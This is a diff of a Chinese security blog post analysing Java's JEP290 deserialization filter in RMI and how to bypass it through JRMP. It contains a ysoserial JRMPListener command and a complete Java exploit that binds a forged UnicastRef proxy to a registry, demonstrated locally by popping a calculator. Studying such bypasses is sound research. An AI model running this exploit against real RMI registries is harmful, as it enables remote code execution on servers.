@@ -299,54 +299,54 @@
 <h2 id="0x02-关于-JEP290"><a href="#0x02-关于-JEP290" class="headerlink" title="0x02 关于 JEP290"></a>0x02 关于 JEP290</h2><p>JEP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案，主要做了以下几件事</p>
 <p>1、提供一个限制反序列化类的机制，白名单或者黑名单。<br>2、限制反序列化的深度和复杂度。<br>3、为 RMI 远程调用对象提供了一个验证类的机制。<br>4、定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器。</p>
 <p>官方从 8u121，7u13，6u141 分别支持了这个 JEP</p>
-<h2 id="0x03-JEP290-防御手段分析"><a href="#0x03-JEP290-防御手段分析" class="headerlink" title="0x03 JEP290 防御手段分析"></a>0x03 JEP290 防御手段分析</h2><p>先起一个 RMI 的服务，代码详见 —— <a class="link"   target="_blank" rel="noopener" href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/RMI" >https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/RMI<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x03-JEP290-防御手段分析"><a href="#0x03-JEP290-防御手段分析" class="headerlink" title="0x03 JEP290 防御手段分析"></a>0x03 JEP290 防御手段分析</h2><p>先起一个 RMI 的服务，代码详见 —— <a class="link" target="_blank" rel="noopener" href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/RMI">https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/RMI<i class="fas fa-external-link-alt"></i></a></p>
 <p>尝试去攻击，这里会报错，报错部分信息为</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java.io.ObjectInputStream filterCheck</span><br><span class="line">信息: ObjectInputFilter REJECTED: <span class="keyword">class</span> <span class="title class_">sun</span>.reflect.annotation.AnnotationInvocationHandler</span><br></pre></td></tr></table></figure>
 
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/attackFailed.png" class>
 
-
-<p>可以先看一下官方文档对于 JEP290 的描述 <a class="link"   target="_blank" rel="noopener" href="http://openjdk.java.net/jeps/290" >http://openjdk.java.net/jeps/290<i class="fas fa-external-link-alt"></i></a></p>
+<p>可以先看一下官方文档对于 JEP290 的描述 <a class="link" target="_blank" rel="noopener" href="http://openjdk.java.net/jeps/290">http://openjdk.java.net/jeps/290<i class="fas fa-external-link-alt"></i></a></p>
 <ul>
 <li>我们很容易通过描述来看对应增加的 Filter 点是什么，如图找到了 <code>ObjectInputFilter</code> 相关的类</li>
 </ul>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/objectFilter.png" class>
 
 <p>我这里去看了看 <code>ObjectInputFilter</code> 相关的类，断点是下不去的，所以去到控制台去看，发现在 <code>RegistryImpl_Skel</code> 类中也存在报错现象，而这个类在 RMI 中是用来做反序列化的方法的。</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/DebugReadObject.png" class>
 
 <p>跟进，<code>ObjectInputStream</code> 类调用了 <code>readObject0()</code> 方法，继续跟进</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/readObject0.png" class>
 
 <p>先获取输入当中 <code>blkmode</code>，如果数据为 true，则继续进行后续判断，后续做了一部分的数据处理工作，我们直接来看最重要的地方 1573 行，调用了 <code>checkResolve()</code> 方法，跟进</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/checkResolve.png" class>
 
 <p>跟进 <code>readClassDesc()</code> 方法，这个方法主要是读取并返回类描述符，并判断这一类描述符是否可以解析为本地 VM 中的类。</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/readClassDesc.png" class>
 
 <p>在 <code>readClassDesc()</code> 方法中，判断 tc 所对应的类型，这里跟进 <code>readProxyDesc()</code> 方法</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/readProxyDesc.png" class>
 
 <p><code>readProxyDesc()</code> 方法做完一系列基础判断之后调用了 <code>filterCheck()</code> 方法，跟进</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/filterCheck.png" class>
 
 <p>而 <code>filterCheck()</code> 方法又调用了 <code>checkInput()</code> 方法，这里应该是最终来判断输入是否合法的地方。</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/checkInput.png" class>
 
 <p>这里的判断会进行两次，一个是开启 JVM 的 <code>java.rmi.Remote</code> 类，另一个是我们放入的恶意利用类 <code>sun.reflect.annotation.AnnotationInvocationHandler</code>，第一次会先判断 <code>java.rmi.Remote</code> 类是否合法</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/JudgeRemote.png" class>
 
 <p>对应的判断代码，其实也就是白名单了。代码会首先判断 <code>var2</code> 是否等于 <code>String</code> 类型。如果不是，则继续判断它是否满足下列几个条件中的任意一个：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;</span><br></pre></td></tr></table></figure>
 
 <p>而这里，我们的 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 类并不在这些白名单中，所以会被过滤</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/REJCTEDD.png" class>
 
 <h2 id="0x04-JEP290-绕过"><a href="#0x04-JEP290-绕过" class="headerlink" title="0x04 JEP290 绕过"></a>0x04 JEP290 绕过</h2><p>这里我们可以先看一下白名单里面都能过什么，白名单如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">Number</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">Remote</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">Proxy</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">UnicastRef</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">RMIClientSocketFactory</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">RMIServerSocketFactory</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">ActivationID</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">UID</span>.class</span><br></pre></td></tr></table></figure>
 
 <p>这里我觉得还是得从它在 JDK8u221 的具体环境下的流程分析入手，看一下在攻击流程之后哪里可以能够被利用，哪里可以 bypass</p>
 <h3 id="绕过利用"><a href="#绕过利用" class="headerlink" title="绕过利用"></a>绕过利用</h3><p>思考了在 RMI 的流程当中，哪一步能够绕过 JEP290 的检测，最终是 JRMP 的这一步，能够绕过，从原理图来说的话应该是这样</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/JRMP.png" class>
 
 <p>先用 ysoserial 开启 JRMP 3333 端口的监听</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections5 <span class="string">&quot;Calc&quot;</span></span><br></pre></td></tr></table></figure>
@@ -354,14 +354,14 @@
 <p>然后编写 RMI 的 EXP</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BypassJEP290</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">reg</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>); <span class="comment">// rmi start at 2222</span></span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">3333</span>); <span class="comment">// JRMPListener&#x27;s port is 3333</span></span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(BypassJEP290.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        reg.bind(<span class="string">&quot;Hello&quot;</span>,proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/Calc.png" class>
 
 <p>这个 payload 的原理就是伪造了一个 <code>UnicastRef</code> 用于跟注册中心通信，我们从 <code>bind()</code> 方法开始分析一下这一整个流程。</p>
 <h3 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>我们通过 <code>getRegistry</code> 时获得的注册中心，其实就是一个封装了 <code>UnicastServerRef</code> 对象的对象</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/Ref.png" class>
 
 <p>当我们调用 <code>bind</code> 方法后，会通过 <code>UnicastRef</code> 对象中存储的信息与注册中心进行通信</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/nweBind.png" class>
 
 <p>这里会通过 ref 与注册中心通信，并将绑定的对象名称以及要绑定的远程对象发过去，注册中心在后续会对应进行反序列化</p>
 <p>接着来看看 yso 中的 JRMPClient 是做了什么操作</p>
@@ -372,36 +372,36 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">readObject:<span class="number">455</span>, RemoteObject (java.rmi.server)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1170</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">2178</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2069</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1573</span>, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:<span class="number">2287</span>, ObjectInputStream (java.io)</span><br><span class="line">readSerialData:<span class="number">2211</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2069</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1573</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">431</span>, ObjectInputStream (java.io)     <span class="comment">// 从此处开始，会遇到很多字节码不匹配的问题</span></span><br><span class="line">dispatch:<span class="number">92</span>, RegistryImpl_Skel (sun.rmi.registry)</span><br><span class="line">oldDispatch:<span class="number">469</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line">dispatch:<span class="number">301</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line">run:<span class="number">200</span>, Transport$<span class="number">1</span> (sun.rmi.transport)</span><br><span class="line">run:<span class="number">197</span>, Transport$<span class="number">1</span> (sun.rmi.transport)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">serviceCall:<span class="number">196</span>, Transport (sun.rmi.transport)</span><br><span class="line">handleMessages:<span class="number">573</span>, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">run0:<span class="number">834</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">lambda$run$<span class="number">0</span>:<span class="number">688</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">run:-<span class="number">1</span>, <span class="number">1330984495</span> (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$<span class="number">5</span>)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">run:<span class="number">687</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">runWorker:<span class="number">1149</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">624</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>
 
 <p>一路跟进到 <code>sun.rmi.transport.LiveRef#read</code></p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/read.png" class>
 
 <p>可以看到这里把 payload 里所传入的 <code>LiveRef</code> 解析到 <code>var5</code> 变量处，里面包含了 <code>ip</code> 与 <code>端口</code> 信息(JRMPListener 的端口)。这些信息将用于后面注册中心与 JRMP 端建立通信。</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/newLiveRefReturn.png" class>
 
 <p>跟进 <code>saveRef()</code> 方法，里面做了一个映射，其建立了一个 <code>TCPEndpoint</code> 到 <code>ArrayList&lt;LiveRef&gt;</code> 的映射关系。</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/saveRef.png" class>
 
 <p>到这里 JRMP 的通信流程基本结束了，接着再回到 <code>dispatch()</code> 方法，在调用了 <code>readObject</code> 方法之后调用了 <code>var2.releaseInputStream();</code>，跟进</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/releaseInputStream.png" class>
 
 <p><code>releaseInputStream()</code> 方法调用了 <code>this.in.registerRefs()</code> 方法，跟进。其中先判断了当前保存的 Ref 是否为空，再获取当前 Ref，这个 Ref 实际上就是创建的 JRMP 连接，再跟进 <code>registerRefs()</code> 方法</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/registerRefs.png" class>
 
 <p>var2这里返回的是 DGCClient 对象，里边同样封装了我们的端口信息</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/lookup.png" class>
 
 <p>接着看到 <code>registerRefs</code> 方法中的 <code>this.makeDirtyCall(var2, var3);</code>，跟进一下</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/makeDirtyCall.png" class>
 
 <p>里面主要是做了数据处理，将原本保存了 EndPoint 的 var1 —— HashSet 数组转换为 ObjID，同时，调用了 <code>this.dgc.dirty()</code> 方法，跟进。</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/dirty.png" class>
 
 <p>在 <code>dirty()</code> 方法中调用 <code>wirteObject()</code> 方法后，会用 <code>invoke()</code> 将数据发出去。</p>
 <p><code>invoke()</code> 方法实现的过程就是从 socket 连接中先读取了输入，然后直接反序列化，此时的反序列化并没有设置 filter（白名单），所以这里可以直接导致注册中心 rce，所以我们可以伪造一个 socket 连接并把我们恶意序列化的对象发过去，这也就是当时用 ysoserial 开启的 JRMP</p>
-
+<img src="/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/FInalReadObject.png" class>
 
 <p>至此绕过分析结束</p>
 <h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>本身 JEP290 的绕过分析的思路是非常清晰的，但是整个流程还是比较复杂的，总结一下是从 RMI 通信的流程当中找到了可乘之机。</p>
-<h2 id="0x06-Ref"><a href="#0x06-Ref" class="headerlink" title="0x06 Ref"></a>0x06 Ref</h2><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8706" >https://xz.aliyun.com/t/8706<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x06-Ref"><a href="#0x06-Ref" class="headerlink" title="0x06 Ref"></a>0x06 Ref</h2><p><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8706">https://xz.aliyun.com/t/8706<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
